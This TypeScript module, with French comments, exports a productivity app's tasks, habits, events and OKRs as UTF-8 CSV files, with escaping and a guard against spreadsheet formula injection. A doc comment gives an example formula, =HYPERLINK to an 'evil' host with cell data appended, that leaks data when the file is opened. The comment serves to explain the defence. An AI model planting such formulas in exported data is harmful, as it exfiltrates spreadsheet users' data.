/**
 * CSV export — utilitaires client-side pour exporter tâches, habitudes,
 * événements et OKR au format CSV (RFC 4180-ish).
 *
 * Pas de dépendance — String concat + Blob download. Compatible Excel + Google
 * Sheets (le séparateur est la virgule, l'encoding est UTF-8 avec BOM pour
 * forcer Excel à reconnaître les caractères accentués).
 */

import type { Task } from '@/modules/tasks';
import type { Habit } from '@/modules/habits';
import type { CalendarEvent } from '@/modules/events';
import type { OKR } from '@/modules/okrs';

/**
 * Échappe une valeur pour CSV : entoure de guillemets si contient virgule,
 * guillemet, ou retour à la ligne. Les guillemets internes sont doublés.
 *
 * Protège aussi contre la **CSV formula injection** (faille N11) : Excel /
 * Google Sheets interprètent comme formule toute cellule dont le 1er caractère
 * est `= + - @ \t \r`. Un nom de tâche `=HYPERLINK("http://evil/?leak="&A1)`
 * exfiltrerait des données à l'ouverture du fichier. Le mitigateur standard
 * (OWASP) est de préfixer une apostrophe (`'`) — invisible à l'affichage,
 * neutralise l'interprétation formule.
 */
export function escapeCSV(value: unknown): string {
  if (value === null || value === undefined) return '';
  let str = String(value);
  if (str.length > 0 && /^[=+\-@\t\r]/.test(str)) {
    str = `'${str}`;
  }
  if (/[",\n\r]/.test(str)) {
    return `"${str.replace(/"/g, '""')}"`;
  }
  return str;
}

export function rowsToCSV(headers: string[], rows: unknown[][]): string {
  const head = headers.map(escapeCSV).join(',');
  const body = rows.map(r => r.map(escapeCSV).join(',')).join('\n');
  // BOM UTF-8 pour Excel (sinon les accents s'affichent en gibberish)
  //  = zero-width no-break space = UTF-8 BOM
  return `\uFEFF${head}\n${body}`;
}

function download(filename: string, content: string) {
  const blob = new Blob([content], { type: 'text/csv;charset=utf-8' });
  const url = URL.createObjectURL(blob);
  const a = document.createElement('a');
  a.href = url;
  a.download = filename;
  document.body.appendChild(a);
  a.click();
  document.body.removeChild(a);
  URL.revokeObjectURL(url);
}

function todayStr(): string {
  return new Date().toISOString().split('T')[0];
}

// ═══════════════════════════════════════════════════════════════════
// Exports par module
// ═══════════════════════════════════════════════════════════════════

export function exportTasksCSV(tasks: Task[]): void {
  const headers = ['ID', 'Nom', 'Catégorie', 'Priorité', 'Échéance', 'Temps estimé (min)', 'Complétée', 'Favori', 'Créée le'];
  const rows = tasks.map(t => [
    t.id,
    t.name,
    t.category,
    t.priority,
    t.deadline,
    t.estimatedTime,
    t.completed ? 'Oui' : 'Non',
    t.bookmarked ? 'Oui' : 'Non',
    t.createdAt,
  ]);
  download(`cosmo-taches-${todayStr()}.csv`, rowsToCSV(headers, rows));
}

export function exportHabitsCSV(habits: Habit[]): void {
  const headers = ['ID', 'Nom', 'Description', 'Fréquence', 'Temps estimé (min)', 'Couleur', 'Complétions', 'Créée le'];
  const rows = habits.map(h => {
    const completionsCount = Object.values(h.completions).filter(Boolean).length;
    return [
      h.id,
      h.name,
      h.description || '',
      h.frequency,
      h.estimatedTime,
      h.color,
      completionsCount,
      h.createdAt || '',
    ];
  });
  download(`cosmo-habitudes-${todayStr()}.csv`, rowsToCSV(headers, rows));
}

export function exportEventsCSV(events: CalendarEvent[]): void {
  const headers = ['ID', 'Titre', 'Début', 'Fin', 'Couleur', 'Notes', 'Récurrent'];
  const rows = events.map(e => [
    e.id,
    e.title,
    e.start,
    e.end,
    e.color || '',
    e.notes || '',
    e.recurrence ? 'Oui' : 'Non',
  ]);
  download(`cosmo-agenda-${todayStr()}.csv`, rowsToCSV(headers, rows));
}

export function exportOKRsCSV(okrs: OKR[]): void {
  // Une ligne par KR (avec OKR parent dénormalisé), plus exploitable en tableur
  const headers = [
    'OKR ID',
    'OKR Titre',
    'OKR Description',
    'OKR Catégorie',
    'OKR Progression',
    'OKR Début',
    'OKR Fin',
    'KR Titre',
    'KR Valeur actuelle',
    'KR Valeur cible',
    'KR Unité',
    'KR Complétée',
  ];
  const rows: unknown[][] = [];
  okrs.forEach(okr => {
    if (okr.keyResults.length === 0) {
      rows.push([okr.id, okr.title, okr.description, okr.category, okr.progress, okr.startDate, okr.endDate, '', '', '', '', '']);
    } else {
      okr.keyResults.forEach(kr => {
        rows.push([
          okr.id,
          okr.title,
          okr.description,
          okr.category,
          okr.progress,
          okr.startDate,
          okr.endDate,
          kr.title,
          kr.currentValue,
          kr.targetValue,
          kr.unit,
          kr.completed ? 'Oui' : 'Non',
        ]);
      });
    }
  });
  download(`cosmo-okr-${todayStr()}.csv`, rowsToCSV(headers, rows));
}

/**
 * Export combiné — déclenche les 4 téléchargements en séquence (Safari refuse
 * souvent plusieurs `.click()` simultanés, on les espace de 150 ms).
 */
export function exportAllCSV(data: {
  tasks: Task[];
  habits: Habit[];
  events: CalendarEvent[];
  okrs: OKR[];
}): void {
  exportTasksCSV(data.tasks);
  setTimeout(() => exportHabitsCSV(data.habits), 150);
  setTimeout(() => exportEventsCSV(data.events), 300);
  setTimeout(() => exportOKRsCSV(data.okrs), 450);
}
